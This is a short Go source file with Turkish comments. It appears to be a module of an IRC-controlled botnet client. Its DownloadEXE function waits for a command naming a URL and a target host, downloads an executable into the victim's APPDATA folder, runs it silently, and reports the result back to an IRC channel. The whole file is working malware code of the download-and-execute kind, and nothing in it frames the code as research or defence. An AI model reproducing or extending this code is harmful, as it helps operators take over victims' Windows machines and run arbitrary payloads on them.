package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"

	"github.com/thoj/go-ircevent"
)

//DownloadEXE URL'den exe indirip çalıştırır
func DownloadEXE(url string, filename string, target string, ircConnection *irc.Connection) {
	hostname, err := os.Hostname()
	if err == nil && (target == "*" || target == hostname) {
		output, err := os.Create(os.Getenv("APPDATA") + "\\" + filename)
		if err == nil {
			defer output.Close()
			response, err := http.Get(url)
			if err == nil {
				defer response.Body.Close()
				_, err := io.Copy(output, response.Body)
				if err != nil {
					ircConnection.Privmsg(channel, fmt.Sprintf("%s Dosyasında Hata: %s", url, err.Error()))
				} else {
					go exec.Command(os.Getenv("APPDATA") + "\\" +filename).Run()
					ircConnection.Privmsg(channel, fmt.Sprintf("%s Dosyası Başarıyla Yüklendi ve Çalıştırıldı", url))
				}
			} else {
				ircConnection.Privmsg(channel, fmt.Sprintf("%s Dosyasında Hata: %s", url, err.Error()))
			}
		} else {
			ircConnection.Privmsg(channel, fmt.Sprintf("%s Dosyasında Hata: %s", url, err.Error()))
		}
	}
}
